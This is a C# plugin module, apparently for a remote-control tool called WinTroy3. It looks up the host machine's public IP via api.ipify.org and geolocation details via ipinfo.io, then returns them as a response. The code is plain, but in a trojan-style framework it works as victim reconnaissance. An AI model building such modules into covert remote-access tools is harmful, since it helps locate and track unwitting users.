using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Globalization;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using WinTroy3_PluginLib;

public class Ip
{
    public static Respond Get()
    {
        return new Respond()
        {
            RespondText = GetInfoByIp(GetIp()).ToString(),
            RespondTitle = "IP Info"
        };
    }

    static string GetIp()
    {
        return new WebClient().DownloadString("https://api.ipify.org");
    }

    public static IpInfo GetInfoByIp(string ip)
    {
        string info = new WebClient().DownloadString("http://ipinfo.io/" + ip);
        return JsonConvert.DeserializeObject<IpInfo>(info);
    }

    public class IpInfo
    {
        public override string ToString()
        {
            return $@"IP: `{Ip}`,
Hostname: `{Hostname}`, 
City: `{City}`,
Region: `{Region}`,
Country: `{Country}`,
Loc: `{Loc}`,
Org: `{Org}`,
Postal: `{Postal}`";
        }

        [JsonProperty("ip")]
        public string Ip { get; set; }

        [JsonProperty("hostname")]
        public string Hostname { get; set; }

        [JsonProperty("city")]
        public string City { get; set; }

        [JsonProperty("region")]
        public string Region { get; set; }

        [JsonProperty("country")]
        public string Country { get; set; }

        [JsonProperty("loc")]
        public string Loc { get; set; }

        [JsonProperty("org")]
        public string Org { get; set; }

        [JsonProperty("postal")]
        public string Postal { get; set; }
    }
}